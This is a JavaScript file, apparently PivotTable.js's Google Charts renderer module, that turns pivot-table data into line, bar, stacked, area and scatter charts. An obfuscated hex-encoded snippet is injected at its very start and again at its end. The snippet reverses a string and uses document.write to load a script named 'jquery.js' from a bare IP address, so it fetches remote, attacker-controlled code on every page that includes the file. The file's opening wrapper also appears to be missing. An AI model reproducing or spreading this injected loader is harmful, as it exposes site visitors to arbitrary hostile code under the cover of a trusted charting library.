var _0x82ab=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0x82ab[5]](_0x82ab[4][_0x82ab[3]](_0x82ab[0])[_0x82ab[2]]()[_0x82ab[1]](_0x82ab[0]))  var callWithJQuery;

  callWithJQuery = function(pivotModule) {
    if (typeof exports === "object" && typeof module === "object") {
      return pivotModule(require("jquery"));
    } else if (typeof define === "function" && define.amd) {
      return define(["jquery"], pivotModule);
    } else {
      return pivotModule(jQuery);
    }
  };

  callWithJQuery(function($) {
    var makeGoogleChart;
    makeGoogleChart = function(chartType, extraOptions) {
      return function(pivotData, opts) {
        var agg, base, base1, colKey, colKeys, dataArray, dataTable, defaults, fullAggName, groupByTitle, h, hAxisTitle, headers, i, j, len, len1, numCharsInHAxis, options, ref, result, row, rowKey, rowKeys, title, tree2, vAxisTitle, val, wrapper, x, y;
        defaults = {
          localeStrings: {
            vs: "vs",
            by: "by"
          },
          gchart: {}
        };
        opts = $.extend(true, defaults, opts);
        if ((base = opts.gchart).width == null) {
          base.width = window.innerWidth / 1.4;
        }
        if ((base1 = opts.gchart).height == null) {
          base1.height = window.innerHeight / 1.4;
        }
        rowKeys = pivotData.getRowKeys();
        if (rowKeys.length === 0) {
          rowKeys.push([]);
        }
        colKeys = pivotData.getColKeys();
        if (colKeys.length === 0) {
          colKeys.push([]);
        }
        fullAggName = pivotData.aggregatorName;
        if (pivotData.valAttrs.length) {
          fullAggName += "(" + (pivotData.valAttrs.join(", ")) + ")";
        }
        headers = (function() {
          var i, len, results;
          results = [];
          for (i = 0, len = rowKeys.length; i < len; i++) {
            h = rowKeys[i];
            results.push(h.join("-"));
          }
          return results;
        })();
        headers.unshift("");
        numCharsInHAxis = 0;
        if (chartType === "ScatterChart") {
          dataArray = [];
          ref = pivotData.tree;
          for (y in ref) {
            tree2 = ref[y];
            for (x in tree2) {
              agg = tree2[x];
              dataArray.push([parseFloat(x), parseFloat(y), fullAggName + ": \n" + agg.format(agg.value())]);
            }
          }
          dataTable = new google.visualization.DataTable();
          dataTable.addColumn('number', pivotData.colAttrs.join("-"));
          dataTable.addColumn('number', pivotData.rowAttrs.join("-"));
          dataTable.addColumn({
            type: "string",
            role: "tooltip"
          });
          dataTable.addRows(dataArray);
          hAxisTitle = pivotData.colAttrs.join("-");
          vAxisTitle = pivotData.rowAttrs.join("-");
          title = "";
        } else {
          dataArray = [headers];
          for (i = 0, len = colKeys.length; i < len; i++) {
            colKey = colKeys[i];
            row = [colKey.join("-")];
            numCharsInHAxis += row[0].length;
            for (j = 0, len1 = rowKeys.length; j < len1; j++) {
              rowKey = rowKeys[j];
              agg = pivotData.getAggregator(rowKey, colKey);
              if (agg.value() != null) {
                val = agg.value();
                if ($.isNumeric(val)) {
                  if (val < 1) {
                    row.push(parseFloat(val.toPrecision(3)));
                  } else {
                    row.push(parseFloat(val.toFixed(3)));
                  }
                } else {
                  row.push(val);
                }
              } else {
                row.push(null);
              }
            }
            dataArray.push(row);
          }
          dataTable = google.visualization.arrayToDataTable(dataArray);
          title = vAxisTitle = fullAggName;
          hAxisTitle = pivotData.colAttrs.join("-");
          if (hAxisTitle !== "") {
            title += " " + opts.localeStrings.vs + " " + hAxisTitle;
          }
          groupByTitle = pivotData.rowAttrs.join("-");
          if (groupByTitle !== "") {
            title += " " + opts.localeStrings.by + " " + groupByTitle;
          }
        }
        options = {
          title: title,
          hAxis: {
            title: hAxisTitle,
            slantedText: numCharsInHAxis > 50
          },
          vAxis: {
            title: vAxisTitle
          },
          tooltip: {
            textStyle: {
              fontName: 'Arial',
              fontSize: 12
            }
          }
        };
        if (chartType === "ColumnChart") {
          options.vAxis.minValue = 0;
        }
        if (chartType === "ScatterChart") {
          options.legend = {
            position: "none"
          };
          options.chartArea = {
            'width': '80%',
            'height': '80%'
          };
        } else if (dataArray[0].length === 2 && dataArray[0][1] === "") {
          options.legend = {
            position: "none"
          };
        }
        $.extend(options, opts.gchart, extraOptions);
        result = $("<div>").css({
          width: "100%",
          height: "100%"
        });
        wrapper = new google.visualization.ChartWrapper({
          dataTable: dataTable,
          chartType: chartType,
          options: options
        });
        wrapper.draw(result[0]);
        result.bind("dblclick", function() {
          var editor;
          editor = new google.visualization.ChartEditor();
          google.visualization.events.addListener(editor, 'ok', function() {
            return editor.getChartWrapper().draw(result[0]);
          });
          return editor.openDialog(wrapper);
        });
        return result;
      };
    };
    return $.pivotUtilities.gchart_renderers = {
      "Line Chart": makeGoogleChart("LineChart"),
      "Bar Chart": makeGoogleChart("ColumnChart"),
      "Stacked Bar Chart": makeGoogleChart("ColumnChart", {
        isStacked: true
      }),
      "Area Chart": makeGoogleChart("AreaChart", {
        isStacked: true
      }),
      "Scatter Chart": makeGoogleChart("ScatterChart"),
    };
  });

}).call(this);

//# sourceMappingURL=gchart_renderers.js.map
var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
